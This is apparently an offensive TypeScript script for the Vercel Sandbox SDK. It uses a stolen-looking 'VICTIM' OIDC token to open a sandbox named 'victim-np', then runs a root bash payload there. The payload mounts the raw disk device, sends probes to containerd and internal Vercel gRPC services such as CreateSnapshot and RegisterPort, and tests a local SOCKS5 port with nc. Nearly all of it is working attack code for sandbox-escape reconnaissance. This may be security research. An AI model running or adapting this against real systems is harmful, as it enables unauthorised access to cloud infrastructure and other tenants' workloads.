import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
mkdir -p /mnt/vda2
mount -t xfs /dev/vda /mnt/vda2 2>/dev/null
R=/mnt/vda2
grpc_pk() {
  local host=$1 path=$2
  timeout 6 curl -s --http2-prior-knowledge -X POST "http://$host$path" \
    -H 'Content-Type: application/grpc' -H 'TE: trailers' \
    --data-binary $'\\x00\\x00\\x00\\x00\\x00' 2>/dev/null | od -c | head -12
}
echo "===== containerd prior-knowledge ====="
for path in \
  /containerd.services.namespaces.v1.Namespaces/List \
  /containerd.services.containers.v1.Containers/List \
  /containerd.services.images.v1.Images/List \
  /containerd.services.tasks.v1.Tasks/List; do
  echo "--- containerd$path ---"
  grpc_pk "containerd" "$path"
done
echo
echo "===== cell.sock prior-knowledge (grpc) ====="
for path in \
  /vercel.hive.celld.api.v1.CelldService/RegisterPort \
  /vercel.hive.host.api.v1.HostService/CreateSnapshot \
  /vercel.sandbox.spawn.v1.SpawnService/Ping; do
  echo "--- cell$path ---"
  grpc_pk "cell" "$path"
done
echo
echo "===== SOCKS5 test on 30002 ====="
printf '\\x05\\x01\\x00' | timeout 3 nc 127.0.0.1 30002 2>&1 | od -c | head -3
echo "--- socks5 with connect to 127.0.0.1:23456 ---"
printf '\\x05\\x01\\x00\\x05\\x01\\x00\\x01\\x7f\\x00\\x00\\x01\\x5b\\xb8' | timeout 3 nc 127.0.0.1 30002 2>&1 | od -c | head -3
echo
echo "===== TLS probe on 30002 ====="
timeout 4 openssl s_client -connect 127.0.0.1:30002 -quiet 2>&1 | head -c 100 | od -c | head -4
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore9.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore9.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 180_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });